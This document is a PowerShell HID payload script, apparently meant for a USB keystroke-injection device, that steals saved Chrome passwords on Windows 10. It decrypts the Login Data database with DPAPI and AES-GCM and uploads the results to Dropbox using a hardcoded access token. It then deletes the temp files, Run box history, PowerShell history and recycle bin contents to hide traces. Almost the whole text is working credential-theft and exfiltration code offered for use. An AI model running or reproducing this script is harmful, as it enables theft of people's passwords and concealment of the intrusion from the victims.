#########################################################################################################
#                                                               |                                       #
# Title        : Browser-Passwords-Dropbox-Exfiltration         |   ____ _____   ______                 #
# Author       : DIYS.py                                        |  |  _ \_ _\ \ / / ___|  _ __  _   _   #
# Version      : 1.0                                            |  | | | | | \ V /\___ \ | '_ \| | | |  #
# Category     : Credentials, Exfiltration                      |  | |_| | |  | |  ___) || |_) | |_| |  #
# Target       : Windows 10                                     |  |____/___| |_| |____(_) .__/ \__, |  #
# Mode         : HID                                            |                        |_|    |___/   #
# Props        : I am Jakoby, NULLSESSION0X                     |                                       #
#                                                               |                                       # 
#########################################################################################################

<#
.SYNOPSIS
	This script exfiltrates credentials from the browser via Dropbox.
.DESCRIPTION 
	Checkes and saves the credentials from the Chrome browser, then connects to Dropbox and uploads
    the file containing all of the loot.
.Link
	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
#>

$DropBoxAccessToken = "GSLK7HX3eSuRKMeI6to9LQrGW2IYUSIo-Ok8Y5LqrXJB2DDom2KGJ7TeJ-2iR6CO1eFZrSiPSC9e553rfUoFt7-fuShCWhYDdESV6Tz2-l_olevsC3grpL1wODKB_nGviScxvqGS0E1ZeMcRTGGs9au-EkwqltiAOF5C2J6AulBD17OCtiof6dHJENMHF4W8G61GC67Y-mNX2lFiKMi4Gjuzp91isHAmJY4s2WSRjxS_9dFmputC3stpY5puQZrsusPv5kj4flTISDqa7-FvAWMObPX_S0u9aO55klAAzsHx32gyjf8U54pVGChDHnMUHDDdDkZaeuRyPbTai_YOQFROQo3wc71nIs58QQ7JuJuFEeqCW1NlAA_zrLO128dHL4xSLk75oa51oCupcCdsXRS6lnJh3K0dtIONRAvmtPG8dIPbd7f9ZyNpdmWWNNz07ptp-QtRKxWwrBi9RgVpk7lLi45PtXe1lg1ELoZV2VhLOcLPHkEaf1QDEjDBWtX7KNZEBnoeY7z-WfeoKjygXNFnCoK9QnSCCwRDKzGtqem12VWoUdod36ny5YaYN2Tt7VsbrQXb9mxYt6SccmwqnRamZHNYvxttomXP0mAtSlLG6oikgPYVeiX9t3ktRhkeWkf5Yh8zufLy3sGxsAoozzSwwh0d3BR_VN0zlms6KVzbq-PfAsMTqRsOUvKjMRssaeiij3P8l4SI8YNMZe-mSLhQekP0tKeM_ZIZ33yAiIGRIFh-s8ZVkagcpKOB2hu1cYns1STVENgAmft2nhUV-vbgPrsv0c365-nupXNU0YVBtXlf-9uKfxP4kAEedljAOppX4jOEmlNsa8r_agEBt66axpA6fK44BD17Ns8RNUGTAGNlrBPuR_5e3MnCLisvarU6FTmkVNZ9yl0L0gqOw70cbK4ihneSZxPhrsscE1GDuIMAaa9fq600aZHbBsfIqHGSIWY4k5zzASSRVPy9BSm_JWXpfWixnSCKbaVSbrPvtS23Wo45Aroa8CJhbVEqaKkKY8Zv4gHnSTzZMpcxEz4w2pvUy920aqgq6MJhGFZWzvN2735N1sHl46JXE7rbgjc14HefU9nQYXnIyhjoqLTa6ktPUjUqngbqtH9uUpcRiPexsliOAny7Q-ZxAnunSk4JSb4wuWlv085c0u98BVtdaDCYosd8eoV5t1eTve0dUHSRZ2yfVL25MFuDc4v7KW_djglRaSGVnrmORs7fyFVclxBII4k3flckYuTUwrURKwmC9u6irU6yKy60AQwL1gCPDBaQq-xzZ-QJl-HQHTT_CxIz7CVXSMoztuc5LxLb-QHdjfsPHrJGSv4bEW5GlhF9KIj4rJhaujm_QeqE_jBKgXZZWnReIodQDZ7YrMNL2tdBmC8z2rtItUE81JWRvp6WwBGrsdRGS1Hs0bGW9qQ"

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"

#Stage 1 Obtain the credentials from the Chrome browsers User Data folder

#First we Kill Chrome just to be safe
Stop-Process -Name Chrome

$d=Add-Type -A System.Security
$p='public static'
$g=""")]$p extern"
$i='[DllImport("winsqlite3",EntryPoint="sqlite3_'
$m="[MarshalAs(UnmanagedType.LP"
$q='(s,i)'
$f='(p s,int i)'
$z=$env:LOCALAPPDATA+'\Google\Chrome\User Data'
$u=[Security.Cryptography.ProtectedData]
Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"
$s=[W]::O("$z\\Default\\Login Data",[ref]$d)
$l=@()
if($host.Version-like"7*"){$b=(gc "$z\\Local State"|ConvertFrom-Json).os_crypt.encrypted_key
$x=[Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))}$_=[W]::P($d,"SELECT*FROM logins WHERE blacklisted_by_user=0",-1,[ref]$s,0)
for(;!([W]::S($s)%100)){$l+=[W]::T($s,0),[W]::T($s,3)
$c=[W]::B($s,5)
try{$e=$u::Unprotect($c,$n,0)}catch{if($x){$k=$c.length
$e=[byte[]]::new($k-31)
$x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=($e|%{[char]$_})-join''}
#After Decrypting the contents of the files, save them to a file in the temp folder.

echo $l >> $env:TMP\$FileName

#Start Chrome again

$pathToChrome = 'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'
Start-Process -FilePath $pathToChrome

#Stage 2 Upload them to Dropbox

<#
.NOTES 
	This is to upload your files to dropbox
#>

$TargetFilePath="/$FileName"
$SourceFilePath="$env:TMP\$FileName"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers


#Stage 3 Cleanup Traces

<#
.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

exit
